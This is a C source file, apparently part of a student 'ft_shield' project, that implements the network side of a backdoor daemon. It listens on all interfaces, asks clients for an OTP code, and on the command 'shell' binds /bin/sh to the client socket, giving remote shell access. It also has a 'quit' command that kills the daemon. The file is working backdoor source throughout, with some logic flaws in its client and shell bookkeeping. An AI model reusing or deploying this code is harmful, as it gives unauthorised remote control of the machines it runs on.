// include here all functions related to socket networking
#include "../includes/ft_shield.h"

void init_socket_struct(t_daemon *daemon) {
    // Init struct that the socket needs
	//  IPV4 addresses
	daemon->_addr.sin_family      = AF_INET;
	//  Convert our port to a network address (host to network)
	daemon->_addr.sin_port        = htons(DEFAULT_PORT);
	//  Our address as integer
	daemon->_addr.sin_addr.s_addr = INADDR_ANY; // LOCALHOST
}

//pass with reserve of memory 
bool init_server(t_daemon *daemon) {
	int opt = 1;
	//initialize to zero all the values of the struct
	memset(daemon->_shell_pids, 0, sizeof(daemon->_shell_pids));
	memset(daemon->_shell_fds, 0, sizeof(daemon->_shell_fds));
	daemon->_running_shells = 0;
	memset(daemon->_auth_client, 0, sizeof(daemon->_auth_client));
	daemon->_pollfds_size = 0;

	init_socket_struct(daemon);
	// Create the socket
	if ((daemon->_socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("Failed to create socket");
		return(false);
	}
	// Set socket options (reuse address)
	if (setsockopt(daemon->_socket_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) == -1) {
		close(daemon->_socket_fd);
        perror("Failed to set socket options");
		return(false);
	}
	// Bind the socket to the address and port
	if (bind(daemon->_socket_fd, (const sock_addr*)&daemon->_addr, sizeof(daemon->_addr)) == -1) {
		close(daemon->_socket_fd);
        perror("Error binding socket");
		return(false);
	}
	// Start listening for connections, with MAX_CLIENTS backlog
	if (listen(daemon->_socket_fd, MAX_CLIENTS) == -1) {
		close(daemon->_socket_fd);
        perror("Error starting to listen on socket");
		return(false);
	}
	return(true);  // Successfully listening
}

void	init_pollfd(t_daemon *daemon)
{
	memset(daemon->_poll_fds, 0, sizeof(daemon->_poll_fds));
	daemon->_poll_fds[0] = (struct pollfd){daemon->_socket_fd, POLLIN, 0};
    daemon->_pollfds_size = 1;
}

void server_listen(t_daemon *daemon) {
	int ret;
	
	init_pollfd(daemon);
	while (true)
	{
		pid_waiter(daemon);
		ret = poll(daemon->_poll_fds, daemon->_pollfds_size, 100);
		if (ret < 0) {
			perror("Poll error");
			return;
		}
		if (ret == 0)
			continue;
		if (fd_ready(daemon) == 1)
        {
			return ;
        }
	}
}

bool    fd_ready( t_daemon *daemon )
{
	for (size_t i = 0; i < daemon->_pollfds_size; i++)
	{
		if (daemon->_poll_fds[i].revents == 0)
			continue;
		if (daemon->_poll_fds[i].fd == daemon->_socket_fd)
		{ 
			accept_communication(daemon);
			return 0;
		}
		else
		{
			receive_communication(i, daemon);
			return 0;
		}
	}
	return 1;
}

void	accept_communication(t_daemon *daemon)
{
	int 	fd = 0;
	sock_in client_addr;
	socklen_t client_addr_size = sizeof(client_addr);
	fd = accept(daemon->_socket_fd, (sock_addr*)&client_addr, &client_addr_size);
	if (fd < 0)
	{
		if (errno != EWOULDBLOCK)
			perror("  accept() failed");
		return ;
	}
	if (fcntl(fd, F_SETFL, O_NONBLOCK) == -1)
	{
		perror(" FCNTL failed");
		return ;
	}
    if (daemon->_pollfds_size - 1 < MAX_CLIENTS)
	{
	    add_user(fd, daemon);
	    if (dprintf(fd, "Ingrese el código OTP: ") < 0) {
	    	perror("Error escribiendo al fd");
	    }
    }
    else
    {
        close(fd);
    }
}

void	receive_communication(int i, t_daemon *daemon)
{
	char buffer[MSG_SIZE];
	int len;
	memset(buffer, 0, MSG_SIZE);
	len = recv(daemon->_poll_fds[i].fd, buffer, sizeof(buffer), 0);
	if (len < 0)
	{
		if (errno != EWOULDBLOCK)
			perror("  recv() failed");
		exit(EXIT_FAILURE);
	}
	if (len == 0)
	{
		delete_user(i, daemon);
		return ;
	}
	buffer[len-1] = 0;
	if (daemon->_auth_client[i] == false)
	{	// TODO refactorizar esto en otra función ya que es mejor poner en la lista _auth_client a los autorizados
		//	printf("me ha llegado este código %s\n", buffer);
		if (authenticate(buffer) == true)
		{
	//		printf("aceptado, pase usted\n");
			daemon->_auth_client[i] = true;
		}
		else
			delete_user(i, daemon);
	}
	if (buffer[0] != 0)
	{	
		if (strcmp(buffer, "quit") == 0) // Case sensitive
		{
            for (size_t i = 0; i < daemon->_pollfds_size; i++)
                close(daemon->_poll_fds[i].fd);
            free(daemon);
			exit(EXIT_SUCCESS);
		}
		else if (strcmp(buffer, "shell") == 0)
		{
			create_shell(daemon->_poll_fds[i].fd, daemon);
		}
		else if (strcmp(buffer, "?") == 0)
		{
			dprintf(daemon->_poll_fds[i].fd, "? show help\nshell Spawn remote shell\nquit shut down the server\n");
		}
	}
}

void create_shell(int fd, t_daemon *daemon) {
    pid_t pid;
    pid = fork();
    if (pid == -1) {
        perror("Fork failed");
        return;
    }
    if (pid == 0) {
        // Child process
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);

        char * const argv[] = {"/bin/sh", NULL};
        execve("/bin/sh", argv, NULL);
        // Si execl falla
        perror("execl failed");
        exit(EXIT_FAILURE);
    } else {

        daemon->_shell_pids[daemon->_running_shells] = pid;
        daemon->_shell_fds[daemon->_running_shells] = fd;
		daemon->_running_shells++;
    }
}


void	add_user(int fd, t_daemon *daemon)
{
    // pollfds_size makes sure its always added at the end
	daemon->_poll_fds[daemon->_pollfds_size] = (struct pollfd){fd, POLLIN, 0};
	daemon->_auth_client[daemon->_pollfds_size] = false;
	daemon->_pollfds_size++;
}

void delete_user(int pollfd_position, t_daemon *daemon)
{
    close(daemon->_poll_fds[pollfd_position].fd);
    daemon->_auth_client[pollfd_position] = false;

    // Relocate the remaining elements to the beginning of the arrangement.
    for (size_t i = pollfd_position; i < daemon->_pollfds_size - 1; i++)
    {
        daemon->_poll_fds[i] = daemon->_poll_fds[i + 1];
        daemon->_auth_client[i] = daemon->_auth_client[i + 1];
    }
    daemon->_pollfds_size--;
}

void	pid_waiter(t_daemon *daemon)
{
	int status;
	int i = 0;

	while (i < daemon->_running_shells)
	{
		if (waitpid(daemon->_shell_pids[i], &status, WNOHANG) != 0)
		{
			if (WIFEXITED(status) || WIFSIGNALED(status))
			{
                //find position of fd on daemon->_poll_fds
                for (size_t j = 0; j < daemon->_pollfds_size; j++)
                {
                    if (daemon->_poll_fds[j].fd == daemon->_shell_fds[i])
                    {
                        delete_user(j, daemon);
                        break;
                    }
                }
				daemon->_running_shells--;
				for (int j = i; j < daemon->_running_shells; j++)
					daemon->_shell_pids[j] = daemon->_shell_pids[j + 1];
			}
		}
		else
			i++;
	}
}
